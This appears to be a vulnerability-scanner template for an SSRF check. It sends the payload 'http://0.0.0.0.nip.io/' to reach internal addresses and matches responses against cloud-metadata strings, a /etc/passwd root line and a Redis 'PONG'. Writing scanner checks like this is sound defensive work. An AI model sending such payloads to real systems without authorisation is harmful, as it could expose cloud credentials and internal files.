id: ssrf3-081
name: 'SSRF encoded IP via url'
severity: high
type: active
tags:
  - ssrf
  - oob
  - cloud
description: 'Fetches internal URL via url (verify manually)'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      url:
        - 'http://0.0.0.0.nip.io/'
    matchers:
      - type: word
        part: body
        words:
          - 'ami-id'
          - 'instance-id'
          - 'metadata'
          - 'root:x:0:0'
          - 'PONG'
